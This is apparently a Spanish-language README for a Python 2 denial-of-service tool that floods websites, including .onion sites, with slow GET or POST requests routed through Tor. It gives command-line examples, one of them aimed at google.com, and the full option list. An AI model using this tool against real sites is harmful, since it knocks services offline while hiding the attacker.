#  spammer-get-atack-tor

----

```Script no serio, solo POC```

Script que permite realizar conexiones cebollas para atacar paginas .onion o paginas convencionales via tor. Capacidad de ajustar la cantidad de informacion a enviar, el numero de hilos a usar, el tiempo de duracion del ataque, atacar a un directorio en especial y etc. Su ataque es sencillo, trata de saturar un recurso en base a peticiones GET en rutas del servidor excesivamente lentas.

----

 ![Alt text](./image/Screenshot_2021-12-11_02-55-33.png) 

Ejemplo:


```python
	python2 script-dos.py -ip 127.0.0.1 -t False -p 8000 -th 20 -c 10 -peticion GET -time 30
```


Este ejemplo atacaria al equipo local hacia el puerto 8000 usando 20 hilos y 10 caracteres por peticion GET, duraria 30 segundos el ataque, el uso tor esta desactivado, para mas inrformacion ```--help```.


```python
	python2  spammer-get-atack-tor.py --help
	usage: spammer-get-atack-tor.py [-h] [-t TOR] [-ip TARGET] [-p PORT] [-th THREADS]
                     [-c CHARS] [-peticion PETICION] [-time TIMEATACK]
                     [-dir DIRECTORIO]
	optional arguments:
	  -h, --help            show this help message and exit
	  -t TOR, --tor TOR     Usar Tor en el ataque, por defecto activado
	  -ip TARGET, --target TARGET
        	                host o ip a atacar
	  -p PORT, --port PORT  puerto a atacar
	  -th THREADS, --threads THREADS
	                        threads/hilos a usar en el ataque, por defecto 20
	  -c CHARS, --chars CHARS
	                        caracteres a enviar, por defecto 20
	  -peticion PETICION, --peticion PETICION
	                        peticones a usar: GET o POST, POST por defecto
	                        ejemplo: python2 script-dos.py -ip www.google.com -p
	                        80 -th 30 -peticion GET -t True
	  -time TIMEATACK, --timeAtack TIMEATACK
	                        tiempo de duracion del ataque en segundosm tiempo por
	                        defecto: 45 segundos
	  -dir DIRECTORIO, --directorio DIRECTORIO

```
Para el ataque via tor, debe a ver un proxy tor SOCKS5 corriendo en la maquina local en el puerto 9050.
----
